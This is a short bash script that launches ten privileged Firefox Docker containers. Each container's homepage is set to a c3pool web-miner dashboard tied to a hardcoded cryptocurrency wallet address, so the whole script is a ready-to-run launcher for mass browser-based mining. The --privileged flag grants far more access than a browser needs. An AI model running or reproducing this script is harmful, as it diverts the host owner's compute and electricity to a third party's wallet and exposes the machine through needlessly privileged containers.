#!/bin/bash
for i in {0..9}
do
	docker run -d --privileged -e "FF_PREF_HOMEPAGE=startup.homepage_welcome_url=\"https://c3pool.com/cn/#/dashboard?addr=8AoKSjCmGuh55dSUt1Kw31i7sbtGcHmBJDx52Ko594ofcSW8jsp917G7Uo2awQZ7T9Ts6y8Au7JZmajbNa38oFkD11ciW1o&web_miner\"" jlesage/firefox:v1.15.0
done
